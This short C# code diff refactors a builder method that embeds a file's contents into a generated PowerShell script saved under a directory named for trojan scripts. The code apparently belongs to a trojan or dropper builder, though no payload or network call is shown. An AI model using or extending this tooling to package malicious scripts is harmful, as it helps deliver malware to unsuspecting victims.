@@ -21,12 +21,12 @@ public class HolderBuilder: CustomBuilder
 
     public void MakeAutoExtract()
     {
-        string template = @"
+        var template = @"
 $xbody = ""__BODY""
 ";
-        string body = System.IO.File.ReadAllText(Model.Body);
+        var body = File.ReadAllText(Model.Body);
         template = template.Replace("__BODY", body);
-        string outputPath = Path.Combine(Model.TroyanScriptDir, "holder", "consts_autoextract.ps1");
+        var outputPath = Path.Combine(Model.TroyanScriptDir, "holder", "consts_autoextract.ps1");
         File.WriteAllText(outputPath, template);
     }
 
